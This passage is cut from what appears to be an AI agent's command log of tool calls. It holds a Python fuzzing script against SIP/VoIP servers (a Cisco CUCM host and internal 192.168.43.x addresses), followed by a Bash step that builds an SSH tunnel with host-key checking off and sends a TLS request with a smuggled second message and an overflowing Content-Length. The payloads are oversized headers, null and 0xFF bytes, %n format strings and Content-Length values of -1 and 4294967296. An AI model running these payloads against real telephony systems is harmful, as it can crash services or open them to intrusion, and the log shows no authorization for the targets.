ry:\n            s.settimeout(2)\n            r = b''\n            while True:\n                try:\n                    c = s.recv(4096)\n                    if not c: break\n                    r += c\n                except: break\n            resp = r.decode(errors='replace')\n            has_sip = 'SIP/2.0' in resp\n            print(f'{label:45s} {\"SIP_RESP\" if has_sip else \"NO_RESP\" if not r else \"RAW:\"+resp[:50]}')\n            return len(r) > 0\n        except socket.timeout:\n            print(f'{label:45s} TIMEOUT')\n            return False\n        except ConnectionResetError:\n            print(f'{label:45s} *** RESET ***')\n            return False\n        finally:\n            s.close()\n    except Exception as e:\n        print(f'{label:45s} ERR: {str(e)[:50]}')\n        return False\n\nprint(\"=== Exp-C App Binary Fuzzing ===\\n\")\n\n# SIP message template\ndef sip(method=\"INVITE\", **overrides):\n    msg = (\n        f'{method} sip:test@ozzu.world SIP/2.0\\r\\n'\n        'Via: SIP/2.0/TCP 192.168.43.77:5060;branch=z9hG4bK-test\\r\\n'\n        'From: <sip:a@ozzu.world>;tag=test\\r\\n'\n        'To: <sip:test@ozzu.world>\\r\\n'\n        'Call-ID: test@ozzu.world\\r\\n'\n        'CSeq: 1 {method}\\r\\n'\n        'Max-Forwards: 70\\r\\n'\n        'Contact: <sip:a@192.168.43.77:5060>\\r\\n'\n        'Content-Length: 0\\r\\n\\r\\n'\n    )\n    for k, v in overrides.items():\n        msg = msg.replace(k, v)\n    return msg\n\n# Phase 1: Baseline\ntest(\"1. OPTIONS\", sip(\"OPTIONS\"))\ntest(\"2. INVITE\", sip(\"INVITE\"))\ntest(\"3. REGISTER\", sip(\"REGISTER\"))\n\n# Phase 2: Oversized headers\nprint(\"\\n--- Via branch overflow ---\")\nfor size in [2000, 4000, 6000, 8000, 10000, 15000, 20000]:\n    test(f\"Via branch {size}B\", sip(\"INVITE\", **{'branch=z9hG4bK-test': f'branch={\"A\"*size}'}))\n    time.sleep(0.15)\n\nprint(\"\\n--- Call-ID overflow ---\")\nfor size in [4000, 8000, 12000]:\n    test(f\"Call-ID {size}B\", sip(\"INVITE\", **{'Call-ID: test@': f'Call-ID: {\"C\"*size}@'}))\n    time.sleep(0.15)\n\n# Phase 3: Binary injection\nprint(\"\\n--- Binary bytes ---\")\nfor byte_val, label in [(0x00, \"null\"), (0xFF, \"0xFF\"), (0x0A, \"LF\")]:\n    data = sip(\"OPTIONS\").encode()\n    data = data.replace(b'branch=z9hG4bK-test', b'branch=z9hG4bK-' + bytes([byte_val]) + b'test')\n    test(f\"Via + {label}\", data)\n    time.sleep(0.15)\n\n# Phase 4: Format strings\nprint(\"\\n--- Format strings ---\")\ntest(\"fmt Via\", sip(\"OPTIONS\", **{'branch=z9hG4bK-test': 'branch=z9hG4bK-%s%n%x'}))\ntest(\"fmt From\", sip(\"OPTIONS\", **{'<sip:a@ozzu.world>': '<sip:%s%n%x@ozzu.world>'}))\ntest(\"fmt Contact\", sip(\"OPTIONS\", **{'<sip:a@192.168.43.77:5060>': '<sip:%s%n%x@192.168.43.77:5060>'}))\n\n# Phase 5: Content-Length abuse\nprint(\"\\n--- CL abuse ---\")\ntest(\"CL -1\", sip(\"INVITE\", **{'Content-Length: 0': 'Content-Length: -1'}))\ntest(\"CL 4294967296\", sip(\"INVITE\", **{'Content-Length: 0': 'Content-Length: 4294967296'}))\ntest(\"CL huge body missing\", sip(\"INVITE\", **{'Content-Length: 0': 'Content-Length: 500000'}))\n\nprint(\"\\n=== DONE ===\")\nPYEOF", "Bash=# Fix Exp-E TLS tunnel\npkill -f \"L 15071\" 2>/dev/null; sleep 1\nssh -o StrictHostKeyChecking=no -f -N -L 15071:192.168.43.201:5061 kazuma-pc 2>&1\nsleep 2\n# Verify TLS works\npython3 -c \"\nimport socket,ssl,time\nctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\nctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE\ns=ctx.wrap_socket(socket.create_connection(('127.0.0.1',15071),timeout=5),server_hostname='cucm-15.ozzu.world')\ns.send(b'OPTIONS sip:t SIP/2.0\\r\\nVia: SIP/2.0/TLS x;branch=z\\r\\nFrom: <x@t>;tag=x\\r\\nTo: <x@t>\\r\\nCall-ID: t\\r\\nCSeq: 1 OPTIONS\\r\\nMax-Forwards: 70\\r\\nContent-Length: 4294967296\\r\\n\\r\\nOPTIONS sip:t SIP/2.0\\r\\nVia: SIP/2.0/TLS x;branch=z9hG4bK-i\\r\\nFrom: <t@t>;tag=i\\r\\nTo: <t@t>\\r\\nCall-ID: i\\r\\nCSeq: 1 OPTIONS\\r\\nCL:0\\r\\n\\r\\n')\ntime.sleep(2)\ntry:\n    r=b''\n    while True